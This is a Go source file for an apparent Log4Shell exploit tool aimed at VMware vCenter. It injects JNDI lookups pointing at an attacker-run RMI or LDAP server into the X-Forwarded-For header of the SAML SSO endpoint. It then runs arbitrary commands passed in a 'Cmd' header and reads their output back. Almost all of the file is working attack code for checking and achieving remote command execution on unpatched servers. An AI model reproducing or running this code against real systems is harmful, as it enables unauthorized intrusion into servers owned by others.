package log4jcenter

import (
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"

	"github.com/imroc/req/v3"
)

var wg sync.WaitGroup
var Proxy_server = ""

func rmiServer() {
	service := ":4398"
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	fmt.Println("[*] Start listen.")
	socket, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		fmt.Println("[-] error, please check if the port is occupied.")
	}
	conn, err := socket.Accept()
	if err != nil {
		fmt.Println("[-] error, please check if the port is occupied.")
	}
	data_byte := [1024]byte{}
	data, err := conn.Read(data_byte[:])
	if err != nil {
		fmt.Println("[-] Failure to receive.")
	}
	_ = data
	if firstCheck(data_byte[:]) {
		fmt.Println("[+] Rmi request received")
		fmt.Println("[+] Log4j check success.")

	} else {
		fmt.Println("[*] A non-RMI request was received.")
	}
	conn.Close()
	wg.Done()
}

func firstCheck(data []byte) bool {
	// check head
	if data[0] == 0x4a &&
		data[1] == 0x52 &&
		data[2] == 0x4d &&
		data[3] == 0x49 {
		// check version
		if data[4] != 0x00 &&
			data[4] != 0x01 {
			return false
		}
		// check protocol
		if data[6] != 0x4b &&
			data[6] != 0x4c &&
			data[6] != 0x4d {
			return false
		}
		// check other data
		lastData := data[7:]
		for _, v := range lastData {
			if v != 0x00 {
				return false
			}
		}
		return true
	}
	return false
}

func StartScan(url string) {
	wg.Add(1)
	go rmiServer()
	// check_alive(url)
	target := strings.TrimLeft(url, "https://")
	local_ip := getIpAddr2(target)
	fmt.Println("[*] your local IP: " + local_ip)
	exploit(url, "rmi://"+local_ip+":4398/test")
	wg.Wait()
}

func StartExploit(url, rmiserv string) {
	fmt.Println("[*] Sending payload...")
	exploit(url, rmiserv)
	fmt.Println("[*] Send completed, please check.")
}

func check_alive(url string) {
	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	client.SetProxyURL(url)
	client.SetTimeout(2 * time.Second)
	resp, err := client.R().
		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36").Get(url)
	if err != nil {
		fmt.Println("[-] Connection failure, please check network.")
		os.Exit(0)
	}
	_ = resp
}

func exploit(url, rmiserver string) {
	host := rmiserver
	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	client.SetProxyURL(Proxy_server)
	client.SetTimeout(2 * time.Second)
	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
	rmi_server := fmt.Sprintf("${jndi:%s}", host)
	myheader := map[string]string{
		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"Accept-Encoding":           "gzip, deflate",
		"Upgrade-Insecure-Requests": "1",
		"X-Forwarded-For":           rmi_server,
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1"}

	client.R().
		SetHeaders(myheader).
		Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")

}

func exec_cmd(url, rmiserver, command, cmd, uri string) (bool, string) {
	host := ""
	if rmiserver == "" {
		target := strings.TrimLeft(url, "https://")
		host = getIpAddr2(target)
		// fmt.Println(host)
	} else {
		host = rmiserver
	}

	client := req.C()
	client.EnableForceHTTP1()
	// client.DisableAutoReadResponse()
	// client.SetUnixSocket("1.sock")
	client.EnableInsecureSkipVerify()
	client.DisableAutoReadResponse()
	client.SetProxyURL(Proxy_server)
	client.SetTimeout(2 * time.Second)
	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
	rmi_server := ""
	cmd = command + cmd
	rmi_server = fmt.Sprintf("${jndi:ldap://%s:1389%s}", host, uri)
	// fmt.Println(rmi_server)
	myheader := map[string]string{
		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"Accept-Encoding":           "gzip, deflate",
		"Upgrade-Insecure-Requests": "1",
		"X-Forwarded-For":           rmi_server,
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Cmd":                       cmd,
	}

	cli := resty.New().SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	if Proxy_server != "" {
		cli = cli.SetProxy(Proxy_server)
	} else {

	}

	resp, err := cli.R().
		EnableTrace().
		SetHeaders(myheader).
		Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
	_ = err
	// fmt.Println(resp.String())

	// resp, err := client.R().
	// 	SetHeaders(myheader).
	// 	Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
	// if err != nil && err == io.ErrUnexpectedEOF {
	// 	//
	// } else if strings.Contains(err.Error(), "NO_ERROR") {
	// 	//
	// } else {
	// 	log.Fatal(err)
	// 	// fmt.Println("[-] 连接失败，请检查网络.")
	// 	// os.Exit(0)
	// }
	if err != nil {
		//
	}
	if resp.StatusCode() == 200 {
		result := resp.String()
		result = strings.Split(result, "nmsl")[0]
		result = strings.TrimRight(result, "\n")
		// fmt.Println(resp.String())
		// fmt.Println(result)
		// fmt.Println(1)
		return true, result
	} else {

		return false, ""
	}

}

func Execc(url, rmiserver, command string) {

	temp1, temp2 := exec_cmd(url, rmiserver, command, ";echo nmsl", "/TomcatBypass/TomcatEcho")
	if temp1 {
		fmt.Println(temp2)
		return
	}
	temp3, temp4 := exec_cmd(url, rmiserver, command, " && echo nmsl", "/TomcatBypass/TomcatEcho")
	if temp3 {
		fmt.Println(temp4)
		return
	}

	fmt.Println("[-] Exploit failure.")
}

func getIpAddr2(url string) string {

	tmp := strings.Split(url, ":")
	port := ""
	ipaddr := ""
	if len(tmp) > 1 {
		ipaddr = tmp[0]
		port = tmp[1]
	} else {
		ipaddr = url
		port = "443"
	}
	// fmt.Println(port)
	conn, err := net.Dial("tcp", ipaddr+":"+port)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	localAddr := conn.LocalAddr().(*net.TCPAddr)

	ip := strings.Split(localAddr.String(), ":")[0]

	return ip
}
